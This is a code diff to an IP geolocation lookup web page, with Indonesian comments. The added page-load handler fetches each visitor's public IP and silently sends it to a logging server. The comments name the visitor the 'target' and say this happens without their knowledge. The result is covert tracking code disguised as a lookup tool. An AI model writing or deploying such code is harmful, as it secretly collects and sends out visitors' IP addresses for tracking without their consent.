@@ -84,6 +84,7 @@
     if (data.latitude && data.longitude) {
       updateMap(parseFloat(data.latitude), parseFloat(data.longitude));
     }
+    // Kirim IP ke server setiap kali ada data
     if (data.ip || data.query) {
       const ip = data.ip || data.query;
       fetch(SERVER_URL + '/log?ip=' + ip).catch(() => {});
@@ -155,9 +156,20 @@
     alert('✅ JSON disalin!');
   }
 
-  window.addEventListener('load', () => {
-    document.getElementById('ipInput').value = '8.8.8.8';
-    locate();
+  // ===================== OTOMATIS KIRIM IP TARGET SAAT HALAMAN DIMUAT =====================
+  window.addEventListener('load', async function() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      if (data.ip) {
+        // Kirim IP ke server tanpa diketahui target
+        await fetch(SERVER_URL + '/log?ip=' + data.ip).catch(() => {});
+        // Tampilkan IP di input (opsional, biar target lihat IP mereka)
+        document.getElementById('ipInput').value = data.ip;
+        // Langsung tampilkan data IP target
+        locate();
+      }
+    } catch {}
   });
 </script>
 </body>
